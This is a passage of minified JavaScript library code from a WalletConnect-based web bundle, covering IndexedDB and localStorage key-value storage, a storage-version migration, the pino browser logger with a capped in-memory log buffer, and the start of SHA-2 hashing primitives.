            vs = normalizeBaseKey(vs),
            !(!vs || !U.mounts[vs]) && (U.watching && vs in U.unwatch && ((Ss = (Is = U.unwatch)[vs]) == null || Ss.call(Is),
            delete U.unwatch[vs]),
            _s && await dispose(U.mounts[vs]),
            U.mountpoints = U.mountpoints.filter(Ts => Ts !== vs),
            delete U.mounts[vs])
        },
        getMount(vs="") {
            vs = normalizeKey(vs) + ":";
            const _s = Z(vs);
            return {
                driver: _s.driver,
                base: _s.base
            }
        },
        getMounts(vs="", _s={}) {
            return vs = normalizeKey(vs),
            oe(vs, _s.parents).map(Ss => ({
                driver: Ss.driver,
                base: Ss.mountpoint
            }))
        },
        keys: (vs, _s={}) => Es.getKeys(vs, _s),
        get: (vs, _s={}) => Es.getItem(vs, _s),
        set: (vs, _s, Is={}) => Es.setItem(vs, _s, Is),
        has: (vs, _s={}) => Es.hasItem(vs, _s),
        del: (vs, _s={}) => Es.removeItem(vs, _s),
        remove: (vs, _s={}) => Es.removeItem(vs, _s)
    };
    return Es
}
function watch(q, U, Z) {
    return q.watch ? q.watch( (oe, et) => U(oe, Z + et)) : () => {}
}
async function dispose(q) {
    typeof q.dispose == "function" && await asyncCall(q.dispose)
}
function promisifyRequest(q) {
    return new Promise( (U, Z) => {
        q.oncomplete = q.onsuccess = () => U(q.result),
        q.onabort = q.onerror = () => Z(q.error)
    }
    )
}
function createStore(q, U) {
    let Z;
    const oe = () => {
        if (Z)
            return Z;
        const et = indexedDB.open(q);
        return et.onupgradeneeded = () => et.result.createObjectStore(U),
        Z = promisifyRequest(et),
        Z.then(st => {
            st.onclose = () => Z = void 0
        }
        , () => {}
        ),
        Z
    }
    ;
    return (et, st) => oe().then(ws => st(ws.transaction(U, et).objectStore(U)))
}
let defaultGetStoreFunc;
function defaultGetStore() {
    return defaultGetStoreFunc || (defaultGetStoreFunc = createStore("keyval-store", "keyval")),
    defaultGetStoreFunc
}
function get(q, U=defaultGetStore()) {
    return U("readonly", Z => promisifyRequest(Z.get(q)))
}
function set$1(q, U, Z=defaultGetStore()) {
    return Z("readwrite", oe => (oe.put(U, q),
    promisifyRequest(oe.transaction)))
}
function del(q, U=defaultGetStore()) {
    return U("readwrite", Z => (Z.delete(q),
    promisifyRequest(Z.transaction)))
}
function clear(q=defaultGetStore()) {
    return q("readwrite", U => (U.clear(),
    promisifyRequest(U.transaction)))
}
function eachCursor(q, U) {
    return q.openCursor().onsuccess = function() {
        this.result && (U(this.result),
        this.result.continue())
    }
    ,
    promisifyRequest(q.transaction)
}
function keys(q=defaultGetStore()) {
    return q("readonly", U => {
        if (U.getAllKeys)
            return promisifyRequest(U.getAllKeys());
        const Z = [];
        return eachCursor(U, oe => Z.push(oe.key)).then( () => Z)
    }
    )
}
const JSONStringify = q => JSON.stringify(q, (U, Z) => typeof Z == "bigint" ? Z.toString() + "n" : Z)
  , JSONParse = q => {
    const U = /([\[:])?(\d{17,}|(?:[9](?:[1-9]07199254740991|0[1-9]7199254740991|00[8-9]199254740991|007[2-9]99254740991|007199[3-9]54740991|0071992[6-9]4740991|00719925[5-9]740991|007199254[8-9]40991|0071992547[5-9]0991|00719925474[1-9]991|00719925474099[2-9])))([,\}\]])/g
      , Z = q.replace(U, '$1"$2n"$3');
    return JSON.parse(Z, (oe, et) => typeof et == "string" && et.match(/^\d+n$/) ? BigInt(et.substring(0, et.length - 1)) : et)
}
;
function safeJsonParse(q) {
    if (typeof q != "string")
        throw new Error(`Cannot safe json parse value of type ${typeof q}`);
    try {
        return JSONParse(q)
    } catch {
        return q
    }
}
function safeJsonStringify(q) {
    return typeof q == "string" ? q : JSONStringify(q) || ""
}
const x$3 = "idb-keyval";
var z$2 = (q={}) => {
    const U = q.base && q.base.length > 0 ? `${q.base}:` : ""
      , Z = et => U + et;
    let oe;
    return q.dbName && q.storeName && (oe = createStore(q.dbName, q.storeName)),
    {
        name: x$3,
        options: q,
        async hasItem(et) {
            return !(typeof await get(Z(et), oe) > "u")
        },
        async getItem(et) {
            return await get(Z(et), oe) ?? null
        },
        setItem(et, st) {
            return set$1(Z(et), st, oe)
        },
        removeItem(et) {
            return del(Z(et), oe)
        },
        getKeys() {
            return keys(oe)
        },
        clear() {
            return clear(oe)
        }
    }
}
;
const D = "WALLET_CONNECT_V2_INDEXED_DB"
  , E$2 = "keyvaluestorage";
let _$1 = class {
    constructor() {
        this.indexedDb = createStorage({
            driver: z$2({
                dbName: D,
                storeName: E$2
            })
        })
    }
    async getKeys() {
        return this.indexedDb.getKeys()
    }
    async getEntries() {
        return (await this.indexedDb.getItems(await this.indexedDb.getKeys())).map(U => [U.key, U.value])
    }
    async getItem(U) {
        const Z = await this.indexedDb.getItem(U);
        if (Z !== null)
            return Z
    }
    async setItem(U, Z) {
        await this.indexedDb.setItem(U, safeJsonStringify(Z))
    }
    async removeItem(U) {
        await this.indexedDb.removeItem(U)
    }
}
;
var l$1 = typeof globalThis < "u" ? globalThis : typeof window < "u" || typeof window < "u" ? window : typeof self < "u" ? self : {}
  , c$3 = {
    exports: {}
};
(function() {
    let q;
    function U() {}
    q = U,
    q.prototype.getItem = function(Z) {
        return this.hasOwnProperty(Z) ? String(this[Z]) : null
    }
    ,
    q.prototype.setItem = function(Z, oe) {
        this[Z] = String(oe)
    }
    ,
    q.prototype.removeItem = function(Z) {
        delete this[Z]
    }
    ,
    q.prototype.clear = function() {
        const Z = this;
        Object.keys(Z).forEach(function(oe) {
            Z[oe] = void 0,
            delete Z[oe]
        })
    }
    ,
    q.prototype.key = function(Z) {
        return Z = Z || 0,
        Object.keys(this)[Z]
    }
    ,
    q.prototype.__defineGetter__("length", function() {
        return Object.keys(this).length
    }),
    typeof l$1 < "u" && l$1.localStorage ? c$3.exports = l$1.localStorage : typeof window < "u" && window.localStorage ? c$3.exports = window.localStorage : c$3.exports = new U
}
)();
function k$4(q) {
    var U;
    return [q[0], safeJsonParse((U = q[1]) != null ? U : "")]
}
let K$1 = class {
    constructor() {
        this.localStorage = c$3.exports
    }
    async getKeys() {
        return Object.keys(this.localStorage)
    }
    async getEntries() {
        return Object.entries(this.localStorage).map(k$4)
    }
    async getItem(U) {
        const Z = this.localStorage.getItem(U);
        if (Z !== null)
            return safeJsonParse(Z)
    }
    async setItem(U, Z) {
        this.localStorage.setItem(U, safeJsonStringify(Z))
    }
    async removeItem(U) {
        this.localStorage.removeItem(U)
    }
}
;
const N$3 = "wc_storage_version"
  , y$3 = 1
  , O$3 = async (q, U, Z) => {
    const oe = N$3
      , et = await U.getItem(oe);
    if (et && et >= y$3) {
        Z(U);
        return
    }
    const st = await q.getKeys();
    if (!st.length) {
        Z(U);
        return
    }
    const ws = [];
    for (; st.length; ) {
        const ms = st.shift();
        if (!ms)
            continue;
        const Es = ms.toLowerCase();
        if (Es.includes("wc@") || Es.includes("walletconnect") || Es.includes("wc_") || Es.includes("wallet_connect")) {
            const vs = await q.getItem(ms);
            await U.setItem(ms, vs),
            ws.push(ms)
        }
    }
    await U.setItem(oe, y$3),
    Z(U),
    j$1(q, ws)
}
  , j$1 = async (q, U) => {
    U.length && U.forEach(async Z => {
        await q.removeItem(Z)
    }
    )
}
;
let h$2 = class {
    constructor() {
        this.initialized = !1,
        this.setInitialized = Z => {
            this.storage = Z,
            this.initialized = !0
        }
        ;
        const U = new K$1;
        this.storage = U;
        try {
            const Z = new _$1;
            O$3(U, Z, this.setInitialized)
        } catch {
            this.initialized = !0
        }
    }
    async getKeys() {
        return await this.initialize(),
        this.storage.getKeys()
    }
    async getEntries() {
        return await this.initialize(),
        this.storage.getEntries()
    }
    async getItem(U) {
        return await this.initialize(),
        this.storage.getItem(U)
    }
    async setItem(U, Z) {
        return await this.initialize(),
        this.storage.setItem(U, Z)
    }
    async removeItem(U) {
        return await this.initialize(),
        this.storage.removeItem(U)
    }
    async initialize() {
        this.initialized || await new Promise(U => {
            const Z = setInterval( () => {
                this.initialized && (clearInterval(Z),
                U())
            }
            , 20)
        }
        )
    }
}
;
function tryStringify(q) {
    try {
        return JSON.stringify(q)
    } catch {
        return '"[Circular]"'
    }
}
var quickFormatUnescaped = format$1;
function format$1(q, U, Z) {
    var oe = Z && Z.stringify || tryStringify
      , et = 1;
    if (typeof q == "object" && q !== null) {
        var st = U.length + et;
        if (st === 1)
            return q;
        var ws = new Array(st);
        ws[0] = oe(q);
        for (var ms = 1; ms < st; ms++)
            ws[ms] = oe(U[ms]);
        return ws.join(" ")
    }
    if (typeof q != "string")
        return q;
    var Es = U.length;
    if (Es === 0)
        return q;
    for (var vs = "", _s = 1 - et, Is = -1, Ss = q && q.length || 0, Ts = 0; Ts < Ss; ) {
        if (q.charCodeAt(Ts) === 37 && Ts + 1 < Ss) {
            switch (Is = Is > -1 ? Is : 0,
            q.charCodeAt(Ts + 1)) {
            case 100:
            case 102:
                if (_s >= Es || U[_s] == null)
                    break;
                Is < Ts && (vs += q.slice(Is, Ts)),
                vs += Number(U[_s]),
                Is = Ts + 2,
                Ts++;
                break;
            case 105:
                if (_s >= Es || U[_s] == null)
                    break;
                Is < Ts && (vs += q.slice(Is, Ts)),
                vs += Math.floor(Number(U[_s])),
                Is = Ts + 2,
                Ts++;
                break;
            case 79:
            case 111:
            case 106:
                if (_s >= Es || U[_s] === void 0)
                    break;
                Is < Ts && (vs += q.slice(Is, Ts));
                var Rs = typeof U[_s];
                if (Rs === "string") {
                    vs += "'" + U[_s] + "'",
                    Is = Ts + 2,
                    Ts++;
                    break
                }
                if (Rs === "function") {
                    vs += U[_s].name || "<anonymous>",
                    Is = Ts + 2,
                    Ts++;
                    break
                }
                vs += oe(U[_s]),
                Is = Ts + 2,
                Ts++;
                break;
            case 115:
                if (_s >= Es)
                    break;
                Is < Ts && (vs += q.slice(Is, Ts)),
                vs += String(U[_s]),
                Is = Ts + 2,
                Ts++;
                break;
            case 37:
                Is < Ts && (vs += q.slice(Is, Ts)),
                vs += "%",
                Is = Ts + 2,
                Ts++,
                _s--;
                break
            }
            ++_s
        }
        ++Ts
    }
    return Is === -1 ? q : (Is < Ss && (vs += q.slice(Is)),
    vs)
}
const format = quickFormatUnescaped;
var browser = pino;
const _console = pfGlobalThisOrFallback().console || {}
  , stdSerializers = {
    mapHttpRequest: mock,
    mapHttpResponse: mock,
    wrapRequestSerializer: passthrough,
    wrapResponseSerializer: passthrough,
    wrapErrorSerializer: passthrough,
    req: mock,
    res: mock,
    err: asErrValue
};
function shouldSerialize(q, U) {
    return Array.isArray(q) ? q.filter(function(oe) {
        return oe !== "!stdSerializers.err"
    }) : q === !0 ? Object.keys(U) : !1
}
function pino(q) {
    q = q || {},
    q.browser = q.browser || {};
    const U = q.browser.transmit;
    if (U && typeof U.send != "function")
        throw Error("pino: transmit option must have a send function");
    const Z = q.browser.write || _console;
    q.browser.write && (q.browser.asObject = !0);
    const oe = q.serializers || {}
      , et = shouldSerialize(q.browser.serialize, oe);
    let st = q.browser.serialize;
    Array.isArray(q.browser.serialize) && q.browser.serialize.indexOf("!stdSerializers.err") > -1 && (st = !1);
    const ws = ["error", "fatal", "warn", "info", "debug", "trace"];
    typeof Z == "function" && (Z.error = Z.fatal = Z.warn = Z.info = Z.debug = Z.trace = Z),
    q.enabled === !1 && (q.level = "silent");
    const ms = q.level || "info"
      , Es = Object.create(Z);
    Es.log || (Es.log = noop),
    Object.defineProperty(Es, "levelVal", {
        get: _s
    }),
    Object.defineProperty(Es, "level", {
        get: Is,
        set: Ss
    });
    const vs = {
        transmit: U,
        serialize: et,
        asObject: q.browser.asObject,
        levels: ws,
        timestamp: getTimeFunction(q)
    };
    Es.levels = pino.levels,
    Es.level = ms,
    Es.setMaxListeners = Es.getMaxListeners = Es.emit = Es.addListener = Es.on = Es.prependListener = Es.once = Es.prependOnceListener = Es.removeListener = Es.removeAllListeners = Es.listeners = Es.listenerCount = Es.eventNames = Es.write = Es.flush = noop,
    Es.serializers = oe,
    Es._serialize = et,
    Es._stdErrSerialize = st,
    Es.child = Ts,
    U && (Es._logEvent = createLogEventShape());
    function _s() {
        return this.level === "silent" ? 1 / 0 : this.levels.values[this.level]
    }
    function Is() {
        return this._level
    }
    function Ss(Rs) {
        if (Rs !== "silent" && !this.levels.values[Rs])
            throw Error("unknown level " + Rs);
        this._level = Rs,
        set(vs, Es, "error", "log"),
        set(vs, Es, "fatal", "error"),
        set(vs, Es, "warn", "error"),
        set(vs, Es, "info", "log"),
        set(vs, Es, "debug", "log"),
        set(vs, Es, "trace", "log")
    }
    function Ts(Rs, Ns) {
        if (!Rs)
            throw new Error("missing bindings for child Pino");
        Ns = Ns || {},
        et && Rs.serializers && (Ns.serializers = Rs.serializers);
        const Hs = Ns.serializers;
        if (et && Hs) {
            var ha = Object.assign({}, oe, Hs)
              , pa = q.browser.serialize === !0 ? Object.keys(ha) : et;
            delete Rs.serializers,
            applySerializers([Rs], pa, ha, this._stdErrSerialize)
        }
        function Zs(Qa) {
            this._childLevel = (Qa._childLevel | 0) + 1,
            this.error = bind(Qa, Rs, "error"),
            this.fatal = bind(Qa, Rs, "fatal"),
            this.warn = bind(Qa, Rs, "warn"),
            this.info = bind(Qa, Rs, "info"),
            this.debug = bind(Qa, Rs, "debug"),
            this.trace = bind(Qa, Rs, "trace"),
            ha && (this.serializers = ha,
            this._serialize = pa),
            U && (this._logEvent = createLogEventShape([].concat(Qa._logEvent.bindings, Rs)))
        }
        return Zs.prototype = this,
        new Zs(this)
    }
    return Es
}
pino.levels = {
    values: {
        fatal: 60,
        error: 50,
        warn: 40,
        info: 30,
        debug: 20,
        trace: 10
    },
    labels: {
        10: "trace",
        20: "debug",
        30: "info",
        40: "warn",
        50: "error",
        60: "fatal"
    }
};
pino.stdSerializers = stdSerializers;
pino.stdTimeFunctions = Object.assign({}, {
    nullTime,
    epochTime,
    unixTime,
    isoTime
});
function set(q, U, Z, oe) {
    const et = Object.getPrototypeOf(U);
    U[Z] = U.levelVal > U.levels.values[Z] ? noop : et[Z] ? et[Z] : _console[Z] || _console[oe] || noop,
    wrap(q, U, Z)
}
function wrap(q, U, Z) {
    !q.transmit && U[Z] === noop || (U[Z] = function(oe) {
        return function() {
            const st = q.timestamp()
              , ws = new Array(arguments.length)
              , ms = Object.getPrototypeOf && Object.getPrototypeOf(this) === _console ? _console : this;
            for (var Es = 0; Es < ws.length; Es++)
                ws[Es] = arguments[Es];
            if (q.serialize && !q.asObject && applySerializers(ws, this._serialize, this.serializers, this._stdErrSerialize),
            q.asObject ? oe.call(ms, asObject(this, Z, ws, st)) : oe.apply(ms, ws),
            q.transmit) {
                const vs = q.transmit.level || U.level
                  , _s = pino.levels.values[vs]
                  , Is = pino.levels.values[Z];
                if (Is < _s)
                    return;
                transmit(this, {
                    ts: st,
                    methodLevel: Z,
                    methodValue: Is,
                    transmitLevel: vs,
                    transmitValue: pino.levels.values[q.transmit.level || U.level],
                    send: q.transmit.send,
                    val: U.levelVal
                }, ws)
            }
        }
    }(U[Z]))
}
function asObject(q, U, Z, oe) {
    q._serialize && applySerializers(Z, q._serialize, q.serializers, q._stdErrSerialize);
    const et = Z.slice();
    let st = et[0];
    const ws = {};
    oe && (ws.time = oe),
    ws.level = pino.levels.values[U];
    let ms = (q._childLevel | 0) + 1;
    if (ms < 1 && (ms = 1),
    st !== null && typeof st == "object") {
        for (; ms-- && typeof et[0] == "object"; )
            Object.assign(ws, et.shift());
        st = et.length ? format(et.shift(), et) : void 0
    } else
        typeof st == "string" && (st = format(et.shift(), et));
    return st !== void 0 && (ws.msg = st),
    ws
}
function applySerializers(q, U, Z, oe) {
    for (const et in q)
        if (oe && q[et]instanceof Error)
            q[et] = pino.stdSerializers.err(q[et]);
        else if (typeof q[et] == "object" && !Array.isArray(q[et]))
            for (const st in q[et])
                U && U.indexOf(st) > -1 && st in Z && (q[et][st] = Z[st](q[et][st]))
}
function bind(q, U, Z) {
    return function() {
        const oe = new Array(1 + arguments.length);
        oe[0] = U;
        for (var et = 1; et < oe.length; et++)
            oe[et] = arguments[et - 1];
        return q[Z].apply(this, oe)
    }
}
function transmit(q, U, Z) {
    const oe = U.send
      , et = U.ts
      , st = U.methodLevel
      , ws = U.methodValue
      , ms = U.val
      , Es = q._logEvent.bindings;
    applySerializers(Z, q._serialize || Object.keys(q.serializers), q.serializers, q._stdErrSerialize === void 0 ? !0 : q._stdErrSerialize),
    q._logEvent.ts = et,
    q._logEvent.messages = Z.filter(function(vs) {
        return Es.indexOf(vs) === -1
    }),
    q._logEvent.level.label = st,
    q._logEvent.level.value = ws,
    oe(st, q._logEvent, ms),
    q._logEvent = createLogEventShape(Es)
}
function createLogEventShape(q) {
    return {
        ts: 0,
        messages: [],
        bindings: q || [],
        level: {
            label: "",
            value: 0
        }
    }
}
function asErrValue(q) {
    const U = {
        type: q.constructor.name,
        msg: q.message,
        stack: q.stack
    };
    for (const Z in q)
        U[Z] === void 0 && (U[Z] = q[Z]);
    return U
}
function getTimeFunction(q) {
    return typeof q.timestamp == "function" ? q.timestamp : q.timestamp === !1 ? nullTime : epochTime
}
function mock() {
    return {}
}
function passthrough(q) {
    return q
}
function noop() {}
function nullTime() {
    return !1
}
function epochTime() {
    return Date.now()
}
function unixTime() {
    return Math.round(Date.now() / 1e3)
}
function isoTime() {
    return new Date(Date.now()).toISOString()
}
function pfGlobalThisOrFallback() {
    function q(U) {
        return typeof U < "u" && U
    }
    try {
        return typeof globalThis < "u" || Object.defineProperty(Object.prototype, "globalThis", {
            get: function() {
                return delete Object.prototype.globalThis,
                this.globalThis = this
            },
            configurable: !0
        }),
        globalThis
    } catch {
        return q(self) || q(window) || q(this) || {}
    }
}
const Vt$3 = getDefaultExportFromCjs(browser)
  , c$2 = {
    level: "info"
}
  , n$1 = "custom_context"
  , l = 1e3 * 1024;
let O$2 = class {
    constructor(U) {
        this.nodeValue = U,
        this.sizeInBytes = new TextEncoder().encode(this.nodeValue).length,
        this.next = null
    }
    get value() {
        return this.nodeValue
    }
    get size() {
        return this.sizeInBytes
    }
}
  , d$2 = class {
    constructor(U) {
        this.head = null,
        this.tail = null,
        this.lengthInNodes = 0,
        this.maxSizeInBytes = U,
        this.sizeInBytes = 0
    }
    append(U) {
        const Z = new O$2(U);
        if (Z.size > this.maxSizeInBytes)
            throw new Error(`[LinkedList] Value too big to insert into list: ${U} with size ${Z.size}`);
        for (; this.size + Z.size > this.maxSizeInBytes; )
            this.shift();
        this.head ? (this.tail && (this.tail.next = Z),
        this.tail = Z) : (this.head = Z,
        this.tail = Z),
        this.lengthInNodes++,
        this.sizeInBytes += Z.size
    }
    shift() {
        if (!this.head)
            return;
        const U = this.head;
        this.head = this.head.next,
        this.head || (this.tail = null),
        this.lengthInNodes--,
        this.sizeInBytes -= U.size
    }
    toArray() {
        const U = [];
        let Z = this.head;
        for (; Z !== null; )
            U.push(Z.value),
            Z = Z.next;
        return U
    }
    get length() {
        return this.lengthInNodes
    }
    get size() {
        return this.sizeInBytes
    }
    toOrderedArray() {
        return Array.from(this)
    }
    [Symbol.iterator]() {
        let U = this.head;
        return {
            next: () => {
                if (!U)
                    return {
                        done: !0,
                        value: null
                    };
                const Z = U.value;
                return U = U.next,
                {
                    done: !1,
                    value: Z
                }
            }
        }
    }
}
  , L$1 = class {
    constructor(U, Z=l) {
        this.level = U ?? "error",
        this.levelValue = browser.levels.values[this.level],
        this.MAX_LOG_SIZE_IN_BYTES = Z,
        this.logs = new d$2(this.MAX_LOG_SIZE_IN_BYTES)
    }
    forwardToConsole(U, Z) {
        Z === browser.levels.values.error ? console.error(U) : Z === browser.levels.values.warn ? console.warn(U) : Z === browser.levels.values.debug ? console.debug(U) : Z === browser.levels.values.trace ? console.trace(U) : console.log(U)
    }
    appendToLogs(U) {
        this.logs.append(safeJsonStringify({
            timestamp: new Date().toISOString(),
            log: U
        }));
        const Z = typeof U == "string" ? JSON.parse(U).level : U.level;
        Z >= this.levelValue && this.forwardToConsole(U, Z)
    }
    getLogs() {
        return this.logs
    }
    clearLogs() {
        this.logs = new d$2(this.MAX_LOG_SIZE_IN_BYTES)
    }
    getLogArray() {
        return Array.from(this.logs)
    }
    logsToBlob(U) {
        const Z = this.getLogArray();
        return Z.push(safeJsonStringify({
            extraMetadata: U
        })),
        new Blob(Z,{
            type: "application/json"
        })
    }
}
  , m$3 = class {
    constructor(U, Z=l) {
        this.baseChunkLogger = new L$1(U,Z)
    }
    write(U) {
        this.baseChunkLogger.appendToLogs(U)
    }
    getLogs() {
        return this.baseChunkLogger.getLogs()
    }
    clearLogs() {
        this.baseChunkLogger.clearLogs()
    }
    getLogArray() {
        return this.baseChunkLogger.getLogArray()
    }
    logsToBlob(U) {
        return this.baseChunkLogger.logsToBlob(U)
    }
    downloadLogsBlobInBrowser(U) {
        const Z = URL.createObjectURL(this.logsToBlob(U))
          , oe = document.createElement("a");
        oe.href = Z,
        oe.download = `walletconnect-logs-${new Date().toISOString()}.txt`,
        document.body.appendChild(oe),
        oe.click(),
        document.body.removeChild(oe),
        URL.revokeObjectURL(Z)
    }
}
  , B$1 = class {
    constructor(U, Z=l) {
        this.baseChunkLogger = new L$1(U,Z)
    }
    write(U) {
        this.baseChunkLogger.appendToLogs(U)
    }
    getLogs() {
        return this.baseChunkLogger.getLogs()
    }
    clearLogs() {
        this.baseChunkLogger.clearLogs()
    }
    getLogArray() {
        return this.baseChunkLogger.getLogArray()
    }
    logsToBlob(U) {
        return this.baseChunkLogger.logsToBlob(U)
    }
}
;
var x$2 = Object.defineProperty
  , S$2 = Object.defineProperties
  , _ = Object.getOwnPropertyDescriptors
  , p$2 = Object.getOwnPropertySymbols
  , T$1 = Object.prototype.hasOwnProperty
  , z$1 = Object.prototype.propertyIsEnumerable
  , f$4 = (q, U, Z) => U in q ? x$2(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , i$1 = (q, U) => {
    for (var Z in U || (U = {}))
        T$1.call(U, Z) && f$4(q, Z, U[Z]);
    if (p$2)
        for (var Z of p$2(U))
            z$1.call(U, Z) && f$4(q, Z, U[Z]);
    return q
}
  , g = (q, U) => S$2(q, _(U));
function k$3(q) {
    return g(i$1({}, q), {
        level: (q == null ? void 0 : q.level) || c$2.level
    })
}
function v$5(q, U=n$1) {
    return q[U] || ""
}
function b$2(q, U, Z=n$1) {
    return q[Z] = U,
    q
}
function y$2(q, U=n$1) {
    let Z = "";
    return typeof q.bindings > "u" ? Z = v$5(q, U) : Z = q.bindings().context || "",
    Z
}
function w$2(q, U, Z=n$1) {
    const oe = y$2(q, Z);
    return oe.trim() ? `${oe}/${U}` : U
}
function E$1(q, U, Z=n$1) {
    const oe = w$2(q, U, Z)
      , et = q.child({
        context: oe
    });
    return b$2(et, oe, Z)
}
function C$2(q) {
    var U, Z;
    const oe = new m$3((U = q.opts) == null ? void 0 : U.level,q.maxSizeInBytes);
    return {
        logger: Vt$3(g(i$1({}, q.opts), {
            level: "trace",
            browser: g(i$1({}, (Z = q.opts) == null ? void 0 : Z.browser), {
                write: et => oe.write(et)
            })
        })),
        chunkLoggerController: oe
    }
}
function I$2(q) {
    var U;
    const Z = new B$1((U = q.opts) == null ? void 0 : U.level,q.maxSizeInBytes);
    return {
        logger: Vt$3(g(i$1({}, q.opts), {
            level: "trace"
        }), Z),
        chunkLoggerController: Z
    }
}
function A$1(q) {
    return typeof q.loggerOverride < "u" && typeof q.loggerOverride != "string" ? {
        logger: q.loggerOverride,
        chunkLoggerController: null
    } : typeof window < "u" ? C$2(q) : I$2(q)
}
var a = Object.defineProperty
  , u = (q, U, Z) => U in q ? a(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , c$1 = (q, U, Z) => u(q, typeof U != "symbol" ? U + "" : U, Z);
let h$1 = class extends IEvents {
    constructor(U) {
        super(),
        this.opts = U,
        c$1(this, "protocol", "wc"),
        c$1(this, "version", 2)
    }
}
;
var p$1 = Object.defineProperty
  , b$1 = (q, U, Z) => U in q ? p$1(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , v$4 = (q, U, Z) => b$1(q, typeof U != "symbol" ? U + "" : U, Z);
let I$1 = class extends IEvents {
    constructor(U, Z) {
        super(),
        this.core = U,
        this.logger = Z,
        v$4(this, "records", new Map)
    }
}
  , y$1 = class {
    constructor(U, Z) {
        this.logger = U,
        this.core = Z
    }
}
  , m$2 = class extends IEvents {
    constructor(U, Z) {
        super(),
        this.relayer = U,
        this.logger = Z
    }
}
  , d$1 = class extends IEvents {
    constructor(U) {
        super()
    }
}
  , f$3 = class {
    constructor(U, Z, oe, et) {
        this.core = U,
        this.logger = Z,
        this.name = oe
    }
}
  , P$2 = class extends IEvents {
    constructor(U, Z) {
        super(),
        this.relayer = U,
        this.logger = Z
    }
}
  , S$1 = class extends IEvents {
    constructor(U, Z) {
        super(),
        this.core = U,
        this.logger = Z
    }
}
  , M$3 = class {
    constructor(U, Z, oe) {
        this.core = U,
        this.logger = Z,
        this.store = oe
    }
}
  , O$1 = class {
    constructor(U, Z) {
        this.projectId = U,
        this.logger = Z
    }
}
;
class R {
    constructor(U, Z, oe) {
        this.core = U,
        this.logger = Z,
        this.telemetryEnabled = oe
    }
}
var T = Object.defineProperty
  , k$2 = (q, U, Z) => U in q ? T(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , i = (q, U, Z) => k$2(q, typeof U != "symbol" ? U + "" : U, Z);
let J$2 = class {
    constructor(U) {
        this.opts = U,
        i(this, "protocol", "wc"),
        i(this, "version", 2)
    }
}
  , V$1 = class {
    constructor(U) {
        this.client = U
    }
}
;
function En$2(q) {
    return q instanceof Uint8Array || ArrayBuffer.isView(q) && q.constructor.name === "Uint8Array"
}
function fe$1(q, ...U) {
    if (!En$2(q))
        throw new Error("Uint8Array expected");
    if (U.length > 0 && !U.includes(q.length))
        throw new Error("Uint8Array expected of length " + U + ", got length=" + q.length)
}
function De$2(q, U=!0) {
    if (q.destroyed)
        throw new Error("Hash instance has been destroyed");
    if (U && q.finished)
        throw new Error("Hash#digest() has already been called")
}
function gn$2(q, U) {
    fe$1(q);
    const Z = U.outputLen;
    if (q.length < Z)
        throw new Error("digestInto() expects output buffer of length at least " + Z)
}
const it$1 = typeof globalThis == "object" && "crypto"in globalThis ? globalThis.crypto : void 0;
/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */
const _t$2 = q => new DataView(q.buffer,q.byteOffset,q.byteLength);
function yn$2(q) {
    if (typeof q != "string")
        throw new Error("utf8ToBytes expected string, got " + typeof q);
    return new Uint8Array(new TextEncoder().encode(q))
}
function de$2(q) {
    return typeof q == "string" && (q = yn$2(q)),
    fe$1(q),
    q
}
let xn$2 = class {
    clone() {
        return this._cloneInto()
    }
}
;
function Bn$2(q) {
    const U = oe => q().update(de$2(oe)).digest()
      , Z = q();
    return U.outputLen = Z.outputLen,
    U.blockLen = Z.blockLen,
    U.create = () => q(),
    U
}
function he$2(q=32) {
    if (it$1 && typeof it$1.getRandomValues == "function")
        return it$1.getRandomValues(new Uint8Array(q));
    if (it$1 && typeof it$1.randomBytes == "function")
        return it$1.randomBytes(q);
    throw new Error("crypto.getRandomValues must be defined")
}
function Cn$2(q, U, Z, oe) {
    if (typeof q.setBigUint64 == "function")
        return q.setBigUint64(U, Z, oe);
    const et = BigInt(32)
      , st = BigInt(4294967295)
      , ws = Number(Z >> et & st)
      , ms = Number(Z & st)
      , Es = oe ? 4 : 0
      , vs = oe ? 0 : 4;
    q.setUint32(U + Es, ws, oe),
    q.setUint32(U + vs, ms, oe)
}
let An$2 = class extends xn$2 {
    constructor(U, Z, oe, et) {
        super(),
        this.blockLen = U,
        this.outputLen = Z,
        this.padOffset = oe,
        this.isLE = et,
        this.finished = !1,
        this.length = 0,
        this.pos = 0,
        this.destroyed = !1,
        this.buffer = new Uint8Array(U),
        this.view = _t$2(this.buffer)
    }
    update(U) {
        De$2(this);
        const {view: Z, buffer: oe, blockLen: et} = this;
        U = de$2(U);
        const st = U.length;
        for (let ws = 0; ws < st; ) {
            const ms = Math.min(et - this.pos, st - ws);
            if (ms === et) {
                const Es = _t$2(U);
                for (; et <= st - ws; ws += et)
                    this.process(Es, ws);
                continue
            }
            oe.set(U.subarray(ws, ws + ms), this.pos),
            this.pos += ms,
            ws += ms,
            this.pos === et && (this.process(Z, 0),
            this.pos = 0)
        }
        return this.length += U.length,
        this.roundClean(),
        this
    }
    digestInto(U) {
        De$2(this),
        gn$2(U, this),
        this.finished = !0;
        const {buffer: Z, view: oe, blockLen: et, isLE: st} = this;
        let {pos: ws} = this;
        Z[ws++] = 128,
        this.buffer.subarray(ws).fill(0),
        this.padOffset > et - ws && (this.process(oe, 0),
        ws = 0);
        for (let Is = ws; Is < et; Is++)
            Z[Is] = 0;
        Cn$2(oe, et - 8, BigInt(this.length * 8), st),
        this.process(oe, 0);
        const ms = _t$2(U)
          , Es = this.outputLen;
        if (Es % 4)
            throw new Error("_sha2: outputLen should be aligned to 32bit");
        const vs = Es / 4
          , _s = this.get();
        if (vs > _s.length)
            throw new Error("_sha2: outputLen bigger than state");
        for (let Is = 0; Is < vs; Is++)
            ms.setUint32(4 * Is, _s[Is], st)
    }
    digest() {
        const {buffer: U, outputLen: Z} = this;
        this.digestInto(U);
        const oe = U.slice(0, Z);
        return this.destroy(),
        oe
    }
    _cloneInto(U) {
        U || (U = new this.constructor),
        U.set(...this.get());
        const {blockLen: Z, buffer: oe, length: et, finished: st, destroyed: ws, pos: ms} = this;
        return U.length = et,
        U.pos = ms,
        U.finished = st,
        U.destroyed = ws,
        et % Z && U.buffer.set(oe),
        U
    }
}
;
const wt$2 = BigInt(2 ** 32 - 1)
